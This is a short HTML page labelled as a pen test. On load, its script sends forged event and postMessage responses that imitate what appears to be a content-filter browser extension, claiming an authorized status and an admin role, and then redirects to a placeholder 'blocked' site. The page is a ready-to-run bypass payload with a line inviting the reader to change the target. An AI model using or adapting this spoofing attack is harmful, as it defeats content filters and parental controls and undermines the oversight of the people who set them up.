<!DOCTYPE html>
<html>
<head>
    <title>Pen Test: Gateway Bypass</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        .status { font-size: 20px; color: #ff0; }
    </style>
</head>
<body>
    <h1>INITIATING BYPASS GATEWAY</h1>
    <p class="status" id="msg">Injecting payloads...</p>

    <script>
        const targetSite = "https://example-blocked-site.com"; // Change to your target

        function executeBypass() {
            // 1. Spoof the 'Authorized' handshake
            window.dispatchEvent(new CustomEvent("youtube/settingsResponse", {
                detail: { payload: { authorized: true, status: "success", showOverlay: false } }
            }));

            // 2. Spoof the 'Admin' role
            window.postMessage({
                type: "explicit-image-filter/openBlockReasonModal-response",
                detail: { payload: { bypass: true, userRole: "admin", status: "verified" } }
            }, "*");

            document.getElementById('msg').innerText = "Payloads Sent. Redirecting...";

            // 3. The Redirect Race
            // We wait 500ms to ensure the events are in the bus before navigating
            setTimeout(() => {
                window.location.href = targetSite;
            }, 500);
        }

        // Run on load
        window.onload = executeBypass;
    </script>
</body>
</html>
